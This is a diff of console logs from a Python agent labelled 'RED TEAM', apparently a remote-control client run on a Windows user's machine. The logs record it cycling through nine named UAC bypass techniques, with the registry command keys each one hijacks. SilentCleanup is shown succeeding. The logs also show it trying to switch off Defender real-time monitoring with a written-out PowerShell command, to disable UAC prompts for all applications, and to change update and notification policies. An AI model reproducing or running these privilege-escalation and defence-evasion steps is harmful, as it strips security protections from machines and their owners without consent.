@@ -1,7 +1,5 @@
-Microsoft Windows [Version 10.0.26200.7462]
-(c) Microsoft Corporation. All rights reserved.
 
-C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad>python client.py
+C:\Users\Brylle>python client.py
 [DEBUG] ================================================================================
 [DEBUG] PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED
 [DEBUG] ================================================================================
@@ -9,7 +7,7 @@ C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad>python clien
 [DEBUG] Platform: win32
 [DEBUG] ================================================================================
 [DEBUG] Step 1: Importing eventlet...
-C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py:35: DeprecationWarning:
+C:\Users\Brylle\client.py:60: DeprecationWarning:
 Eventlet is deprecated. It is currently being maintained in bugfix mode, and
 we strongly recommend against using it for new projects.
 
@@ -84,63 +82,494 @@ Hello from the pygame community. https://www.pygame.org/contribute.html
 [DEBUG] [IMPORTS] Attempting import...
 [DEBUG] [IMPORTS] [OK] socketio imported successfully!
 [INFO] aiortc WebRTC library available - enabling low-latency streaming
-2025-12-28 06:27:59,758 - INFO - aiortc WebRTC library available - enabling low-latency streaming
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
+2026-01-03 08:13:38,458 - INFO - aiortc WebRTC library available - enabling low-latency streaming
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+================================================================================
+[RED TEAM] 🚨 AGGRESSIVE UAC BYPASS INITIATED
+[RED TEAM] Using fodhelper.exe to auto-elevate to admin privileges
+[RED TEAM] This prevents Windows Defender from blocking execution!
+================================================================================
+[INFO] Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:13:39,277 - INFO - Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[RED TEAM] ⚠️ Fodhelper bypass failed - continuing normally
+================================================================================
 [STARTUP] Python Agent Starting...
 [STARTUP] Initializing components...
 ================================================================================
 [STARTUP] PRIORITY 0: Checking Administrator Privileges...
 ================================================================================
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[STARTUP] ✅ Already running as Administrator
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[STARTUP] ⚪ Running as Standard User
+[STARTUP] 🔄 Attempting to request admin privileges...
+[STARTUP] 🔄 Using automatic UAC bypass methods...
+[DEBUG] ================================================================================
+[DEBUG] [UAC BYPASS] attempt_uac_bypass() called
+[DEBUG] ================================================================================
+[DEBUG] [UAC BYPASS] Checking if already admin...
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [UAC BYPASS] Not admin - starting UAC bypass...
+[INFO] [UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...
+2026-01-03 08:13:39,282 - INFO - [UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...
+[WARNING] [REGISTRY] PushNotifications policy failed: [WinError 5] Access is denied
+2026-01-03 08:13:39,284 - WARNING - [REGISTRY] PushNotifications policy failed: [WinError 5] Access is denied
+[WARNING] [REGISTRY] WindowsUpdate policy failed: [WinError 5] Access is denied
+2026-01-03 08:13:39,285 - WARNING - [REGISTRY] WindowsUpdate policy failed: [WinError 5] Access is denied
+[WARNING] [REGISTRY] Context menu runas failed: [WinError 5] Access is denied
+2026-01-03 08:13:39,287 - WARNING - [REGISTRY] Context menu runas failed: [WinError 5] Access is denied
+[WARNING] [REGISTRY] Context menu PowershellAdmin failed: [WinError 5] Access is denied
+2026-01-03 08:13:39,288 - WARNING - [REGISTRY] Context menu PowershellAdmin failed: [WinError 5] Access is denied
+[WARNING] [DEFENDER] DisableRealtimeMonitoring failed: Command '['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true']' timed out after 10 seconds
+2026-01-03 08:13:49,409 - WARNING - [DEFENDER] DisableRealtimeMonitoring failed: Command '['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true']' timed out after 10 seconds
+[DEBUG] [UAC BYPASS] Initializing UAC Manager...
+[DEBUG] [UAC MANAGER] Creating UACBypassManager instance...
+[DEBUG] [UAC MANAGER] Creating RLock (should be patched by eventlet)...
+[DEBUG] [OK] [UAC MANAGER] RLock created successfully
+[DEBUG] [UAC MANAGER] Calling _initialize_methods()...
+[DEBUG] [UAC MANAGER] Registering bypass methods...
+[DEBUG]   Registering method: fodhelper
+[DEBUG]   Registering method: computerdefaults
+[DEBUG]   Registering method: eventvwr
+[DEBUG]   Registering method: sdclt
+[DEBUG]   Registering method: wsreset
+[DEBUG]   Registering method: slui
+[DEBUG]   Registering method: winsat
+[DEBUG]   Registering method: silentcleanup
+[DEBUG]   Registering method: icmluautil
+[DEBUG] [OK] [UAC MANAGER] Registered 9 UAC bypass methods
+[INFO] [UAC MANAGER] Initialized 9 UAC bypass methods
+2026-01-03 08:13:49,429 - INFO - [UAC MANAGER] Initialized 9 UAC bypass methods
+[DEBUG] [OK] [UAC MANAGER] UACBypassManager fully initialized
+[DEBUG] [OK] [UAC BYPASS] UAC Manager initialized with 9 methods
+[DEBUG] [UAC BYPASS] Calling manager.try_all_methods()...
+[INFO] [UAC MANAGER] 9/9 methods available
+2026-01-03 08:14:09,172 - INFO - [UAC MANAGER] 9/9 methods available
+[DEBUG] [UAC MANAGER] Trying 9 UAC bypass methods...
+[INFO] [UAC MANAGER] Trying 9 UAC bypass methods...
+2026-01-03 08:14:09,173 - INFO - [UAC MANAGER] Trying 9 UAC bypass methods...
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 1/9: eventvwr
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 1/9: eventvwr
+2026-01-03 08:14:09,174 - INFO - [UAC MANAGER] Attempt 1/9: eventvwr
+[INFO] [UAC MANAGER] Executing method: Event Viewer
+2026-01-03 08:14:09,175 - INFO - [UAC MANAGER] Executing method: Event Viewer
+[DEBUG]   [METHOD] Checking if Event Viewer is available...
+[DEBUG]   [OK] [METHOD] Event Viewer is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Event Viewer starting in full debug mode
+2026-01-03 08:14:09,176 - WARNING - [UAC BYPASS DEBUG] Event Viewer starting in full debug mode
+[DEBUG]   [METHOD] Executing Event Viewer (ID: 25)...
+[INFO] [UAC BYPASS] Attempting method: Event Viewer (ID: 25)
+2026-01-03 08:14:09,177 - INFO - [UAC BYPASS] Attempting method: Event Viewer (ID: 25)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\mscfile\shell\open\command
+2026-01-03 08:14:09,198 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\mscfile\shell\open\command
+[DEBUG]   [X] [METHOD] Event Viewer EXCEPTION: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:14:09,199 - ERROR - [UAC BYPASS] Method Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC MANAGER] Method 'eventvwr' error: Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:14:20,262 - ERROR - [UAC MANAGER] Method 'eventvwr' error: Event Viewer failed: Event Viewer bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'eventvwr' FAILED
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 2/9: sdclt
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 2/9: sdclt
+2026-01-03 08:14:31,262 - INFO - [UAC MANAGER] Attempt 2/9: sdclt
+[INFO] [UAC MANAGER] Executing method: Sdclt
+2026-01-03 08:14:31,262 - INFO - [UAC MANAGER] Executing method: Sdclt
+[DEBUG]   [METHOD] Checking if Sdclt is available...
+[DEBUG]   [OK] [METHOD] Sdclt is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Sdclt starting in full debug mode
+2026-01-03 08:14:31,263 - WARNING - [UAC BYPASS DEBUG] Sdclt starting in full debug mode
+[DEBUG]   [METHOD] Executing Sdclt (ID: 31)...
+[INFO] [UAC BYPASS] Attempting method: Sdclt (ID: 31)
+2026-01-03 08:14:31,264 - INFO - [UAC BYPASS] Attempting method: Sdclt (ID: 31)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\Folder\shell\open\command
+2026-01-03 08:14:31,280 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\Folder\shell\open\command
+[DEBUG]   [X] [METHOD] Sdclt EXCEPTION: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:14:31,281 - ERROR - [UAC BYPASS] Method Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC MANAGER] Method 'sdclt' error: Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:14:41,724 - ERROR - [UAC MANAGER] Method 'sdclt' error: Sdclt failed: Sdclt bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'sdclt' FAILED
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 3/9: fodhelper
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 3/9: fodhelper
+2026-01-03 08:14:52,546 - INFO - [UAC MANAGER] Attempt 3/9: fodhelper
+[INFO] [UAC MANAGER] Executing method: Fodhelper Protocol
+2026-01-03 08:14:52,547 - INFO - [UAC MANAGER] Executing method: Fodhelper Protocol
+[DEBUG]   [METHOD] Checking if Fodhelper Protocol is available...
+[DEBUG]   [OK] [METHOD] Fodhelper Protocol is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Fodhelper Protocol starting in full debug mode
+2026-01-03 08:14:52,549 - WARNING - [UAC BYPASS DEBUG] Fodhelper Protocol starting in full debug mode
+[DEBUG]   [METHOD] Executing Fodhelper Protocol (ID: 33)...
+[INFO] [UAC BYPASS] Attempting method: Fodhelper Protocol (ID: 33)
+2026-01-03 08:14:52,551 - INFO - [UAC BYPASS] Attempting method: Fodhelper Protocol (ID: 33)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+2026-01-03 08:14:52,574 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+[DEBUG]   [X] [METHOD] Fodhelper Protocol EXCEPTION: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:14:52,575 - ERROR - [UAC BYPASS] Method Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC MANAGER] Method 'fodhelper' error: Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:15:04,072 - ERROR - [UAC MANAGER] Method 'fodhelper' error: Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'fodhelper' FAILED
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 4/9: computerdefaults
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 4/9: computerdefaults
+2026-01-03 08:15:14,667 - INFO - [UAC MANAGER] Attempt 4/9: computerdefaults
+[INFO] [UAC MANAGER] Executing method: Computer Defaults
+2026-01-03 08:15:14,668 - INFO - [UAC MANAGER] Executing method: Computer Defaults
+[DEBUG]   [METHOD] Checking if Computer Defaults is available...
+[DEBUG]   [OK] [METHOD] Computer Defaults is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Computer Defaults starting in full debug mode
+2026-01-03 08:15:14,671 - WARNING - [UAC BYPASS DEBUG] Computer Defaults starting in full debug mode
+[DEBUG]   [METHOD] Executing Computer Defaults (ID: 33)...
+[INFO] [UAC BYPASS] Attempting method: Computer Defaults (ID: 33)
+2026-01-03 08:15:14,672 - INFO - [UAC BYPASS] Attempting method: Computer Defaults (ID: 33)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+2026-01-03 08:15:14,695 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+[DEBUG]   [X] [METHOD] Computer Defaults EXCEPTION: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:15:14,695 - ERROR - [UAC BYPASS] Method Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC MANAGER] Method 'computerdefaults' error: Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:15:25,600 - ERROR - [UAC MANAGER] Method 'computerdefaults' error: Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'computerdefaults' FAILED
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 5/9: silentcleanup
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 5/9: silentcleanup
+2026-01-03 08:15:36,326 - INFO - [UAC MANAGER] Attempt 5/9: silentcleanup
+[INFO] [UAC MANAGER] Executing method: SilentCleanup
+2026-01-03 08:15:36,326 - INFO - [UAC MANAGER] Executing method: SilentCleanup
+[DEBUG]   [METHOD] Checking if SilentCleanup is available...
+[DEBUG]   [OK] [METHOD] SilentCleanup is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] SilentCleanup starting in full debug mode
+2026-01-03 08:15:36,328 - WARNING - [UAC BYPASS DEBUG] SilentCleanup starting in full debug mode
+[DEBUG]   [METHOD] Executing SilentCleanup (ID: 34)...
+[INFO] [UAC BYPASS] Attempting method: SilentCleanup (ID: 34)
+2026-01-03 08:15:36,330 - INFO - [UAC BYPASS] Attempting method: SilentCleanup (ID: 34)
+[DEBUG]   [OK][OK][OK] [METHOD] SilentCleanup SUCCESS!
+[SUCCESS] ✅ [UAC BYPASS] SUCCESS! Method SilentCleanup worked!
+2026-01-03 08:15:41,473 - INFO - ✅ [UAC BYPASS] SUCCESS! Method SilentCleanup worked!
+[SUCCESS] ✅ [UAC MANAGER] Method 'silentcleanup' succeeded!
+2026-01-03 08:15:41,474 - INFO - ✅ [UAC MANAGER] Method 'silentcleanup' succeeded!
+[DEBUG] ================================================================================
+[DEBUG] [OK] [UAC MANAGER] SUCCESS! Method 'silentcleanup' worked!
+[DEBUG] ================================================================================
+[SUCCESS] ✅ [UAC MANAGER] UAC bypass successful with method: silentcleanup!
+2026-01-03 08:15:41,476 - INFO - ✅ [UAC MANAGER] UAC bypass successful with method: silentcleanup!
+[DEBUG] ================================================================================
+[DEBUG] [OK] [UAC BYPASS] Elevated instance launched successfully!
+[DEBUG] [OK] [UAC BYPASS] Checking if THIS process gained admin...
+[DEBUG] ================================================================================
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [!] [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin
+[DEBUG] [!] [UAC BYPASS] The elevated instance will take over
+[WARNING] ⚠️ [UAC BYPASS] Elevated instance launched
+2026-01-03 08:15:43,480 - WARNING - ⚠️ [UAC BYPASS] Elevated instance launched
+[DEBUG] ℹ️ [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)
+[DEBUG] ℹ️ [UAC BYPASS] Note: Both non-admin and admin instances are now running
+[INFO] ℹ️ Original process will continue running alongside elevated instance
+2026-01-03 08:15:43,482 - INFO - ℹ️ Original process will continue running alongside elevated instance
+[STARTUP] ✅ UAC bypass initiated successfully!
+[STARTUP] ⏳ Waiting for elevation to complete...
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[STARTUP] ⚠️ UAC bypass initiated but not yet elevated
+[STARTUP] Continuing with standard user privileges...
 ================================================================================
 [STARTUP] === SYSTEM CONFIGURATION STARTING ===
 [STARTUP] Using SILENT methods (no popups, no user interaction)
 ================================================================================
 [STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...
 [INFO] [WSL] Disabling WSL command routing...
-2025-12-28 06:28:00,462 - INFO - [WSL] Disabling WSL command routing...
+2026-01-03 08:15:46,486 - INFO - [WSL] Disabling WSL command routing...
 [INFO] [WSL] Removed WSL from PATH environment
-2025-12-28 06:28:00,462 - INFO - [WSL] Removed WSL from PATH environment
+2026-01-03 08:15:46,487 - INFO - [WSL] Removed WSL from PATH environment
 [INFO] [WSL] Disabled WSL default distribution (HKCU)
-2025-12-28 06:28:00,464 - INFO - [WSL] Disabled WSL default distribution (HKCU)
-[INFO] [WSL] Disabled WSL default distribution (HKLM)
-2025-12-28 06:28:00,464 - INFO - [WSL] Disabled WSL default distribution (HKLM)
+2026-01-03 08:15:46,488 - INFO - [WSL] Disabled WSL default distribution (HKCU)
 [INFO] [WSL] Forced COMSPEC to: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
-2025-12-28 06:28:00,465 - INFO - [WSL] Forced COMSPEC to: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
+2026-01-03 08:15:46,490 - INFO - [WSL] Forced COMSPEC to: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
 [INFO] ✅ [WSL] WSL routing disabled successfully!
-2025-12-28 06:28:00,465 - INFO - ✅ [WSL] WSL routing disabled successfully!
+2026-01-03 08:15:46,490 - INFO - ✅ [WSL] WSL routing disabled successfully!
 [STARTUP] ✅ WSL routing disabled - commands will use PowerShell directly
 
 [STARTUP] Step 1: AGGRESSIVE ADMIN ACQUISITION (RED TEAM MODE)...
 [STARTUP] ENSURING ADMIN PRIVILEGES BEFORE SECURITY DISABLE!
 [STARTUP] Using multiple UAC bypass techniques for maximum reliability!
 [STARTUP] Admin acquisition attempt 1/3...
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[STARTUP] ✅ Already running as Administrator
-[STARTUP] ✅ ADMIN PRIVILEGES SECURED - PROCEEDING WITH SECURITY DISABLE
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[STARTUP] Current admin status: ✅ ADMIN
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] ================================================================================
+[DEBUG] [BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!
+[DEBUG] [BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC
+[DEBUG] ================================================================================
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [BOOTSTRAP] Not admin - using UAC bypass methods to elevate...
+[DEBUG] [BOOTSTRAP] This works WITHOUT password from standard user account!
+[DEBUG] [BOOTSTRAP] Created elevation script: C:\Users\Brylle\AppData\Local\Temp\uac_disable_elevated.py
+[DEBUG]
+[BOOTSTRAP] Attempting UAC bypass methods...
+[DEBUG] [BOOTSTRAP] UAC Manager loaded with 9 methods
+[INFO] [UAC MANAGER] 9/9 methods available
+2026-01-03 08:15:46,500 - INFO - [UAC MANAGER] 9/9 methods available
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: eventvwr
+[DEBUG] [BOOTSTRAP] EventVwr bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: sdclt
+[DEBUG] [BOOTSTRAP] Sdclt bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: fodhelper
+[DEBUG] [BOOTSTRAP] Fodhelper bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: computerdefaults
+[DEBUG] [BOOTSTRAP] ComputerDefaults bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: silentcleanup
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: icmluautil
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: slui
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: wsreset
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: winsat
+[DEBUG] [BOOTSTRAP] All UAC bypass methods failed
+[DEBUG] ================================================================================
+[DEBUG] [X] [BOOTSTRAP] Could not gain admin via UAC bypass
+[DEBUG] [X] Falling back to standard UAC disable (requires admin)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [UAC DISABLE] STARTING SILENT UAC DISABLE
+[DEBUG] [UAC DISABLE] This will DISABLE admin password popups for ALL applications!
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG]
+[UAC DISABLE] Trying method 1/4...
+[DEBUG] [UAC DISABLE] Method 1: Direct registry modification...
+[DEBUG] [X] [UAC DISABLE] Method 1 FAILED: [WinError 5] Access is denied
+[DEBUG]
+[UAC DISABLE] Trying method 2/4...
+[DEBUG] [UAC DISABLE] Method 2: reg.exe command...
+[DEBUG] [OK] [UAC DISABLE] Method 2 SUCCESS!
+[DEBUG] [UAC DISABLE] Method 2 succeeded! Verifying...
+[DEBUG]
+[UAC DISABLE] Verifying final status...
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [X][X][X] [UAC DISABLE] FAILED!
+[DEBUG] [X] Could not disable UAC with any method
+[DEBUG] [X] May need administrator privileges
+[DEBUG] ================================================================================
+[STARTUP] ⚠️ UAC bypass attempt 1 failed
+[STARTUP] Admin acquisition attempt 2/3...
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] ================================================================================
+[DEBUG] [BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!
+[DEBUG] [BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC
+[DEBUG] ================================================================================
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [BOOTSTRAP] Not admin - using UAC bypass methods to elevate...
+[DEBUG] [BOOTSTRAP] This works WITHOUT password from standard user account!
+[DEBUG] [BOOTSTRAP] Created elevation script: C:\Users\Brylle\AppData\Local\Temp\uac_disable_elevated.py
+[DEBUG]
+[BOOTSTRAP] Attempting UAC bypass methods...
+[DEBUG] [BOOTSTRAP] UAC Manager loaded with 9 methods
+[INFO] [UAC MANAGER] 9/9 methods available
+2026-01-03 08:15:48,901 - INFO - [UAC MANAGER] 9/9 methods available
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: eventvwr
+[DEBUG] [BOOTSTRAP] EventVwr bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: sdclt
+[DEBUG] [BOOTSTRAP] Sdclt bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: fodhelper
+[DEBUG] [BOOTSTRAP] Fodhelper bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: computerdefaults
+[DEBUG] [BOOTSTRAP] ComputerDefaults bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: silentcleanup
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: icmluautil
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: slui
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: wsreset
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: winsat
+[DEBUG] [BOOTSTRAP] All UAC bypass methods failed
+[DEBUG] ================================================================================
+[DEBUG] [X] [BOOTSTRAP] Could not gain admin via UAC bypass
+[DEBUG] [X] Falling back to standard UAC disable (requires admin)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [UAC DISABLE] STARTING SILENT UAC DISABLE
+[DEBUG] [UAC DISABLE] This will DISABLE admin password popups for ALL applications!
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG]
+[UAC DISABLE] Trying method 1/4...
+[DEBUG] [UAC DISABLE] Method 1: Direct registry modification...
+[DEBUG] [X] [UAC DISABLE] Method 1 FAILED: [WinError 5] Access is denied
+[DEBUG]
+[UAC DISABLE] Trying method 2/4...
+[DEBUG] [UAC DISABLE] Method 2: reg.exe command...
+[DEBUG] [OK] [UAC DISABLE] Method 2 SUCCESS!
+[DEBUG] [UAC DISABLE] Method 2 succeeded! Verifying...
+[DEBUG]
+[UAC DISABLE] Verifying final status...
+[DEBUG] ================================================================================
+[DEBUG] [UAC VERIFY] Current UAC Status:
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
+[DEBUG]     0 = No prompts (DISABLED)
+[DEBUG]     1 = Password required (STRICT)
+[DEBUG]     5 = Just click Yes (CONSENT)
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
+[DEBUG] [X][X][X] [UAC DISABLE] FAILED!
+[DEBUG] [X] Could not disable UAC with any method
+[DEBUG] [X] May need administrator privileges
+[DEBUG] ================================================================================
+[STARTUP] ⚠️ UAC bypass attempt 2 failed
+[STARTUP] Admin acquisition attempt 3/3...
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] ================================================================================
+[DEBUG] [BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!
+[DEBUG] [BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC
+[DEBUG] ================================================================================
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [BOOTSTRAP] Not admin - using UAC bypass methods to elevate...
+[DEBUG] [BOOTSTRAP] This works WITHOUT password from standard user account!
+[DEBUG] [BOOTSTRAP] Created elevation script: C:\Users\Brylle\AppData\Local\Temp\uac_disable_elevated.py
+[DEBUG]
+[BOOTSTRAP] Attempting UAC bypass methods...
+[DEBUG] [BOOTSTRAP] UAC Manager loaded with 9 methods
+[INFO] [UAC MANAGER] 9/9 methods available
+2026-01-03 08:15:51,247 - INFO - [UAC MANAGER] 9/9 methods available
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: eventvwr
+[DEBUG] [BOOTSTRAP] EventVwr bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: sdclt
+[DEBUG] [BOOTSTRAP] Sdclt bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: fodhelper
+[DEBUG] [BOOTSTRAP] Fodhelper bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: computerdefaults
+[DEBUG] [BOOTSTRAP] ComputerDefaults bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: silentcleanup
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: icmluautil
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: slui
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: wsreset
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: winsat
+[DEBUG] [BOOTSTRAP] All UAC bypass methods failed
+[DEBUG] ================================================================================
+[DEBUG] [X] [BOOTSTRAP] Could not gain admin via UAC bypass
+[DEBUG] [X] Falling back to standard UAC disable (requires admin)
+[DEBUG] ================================================================================
+[DEBUG] ================================================================================
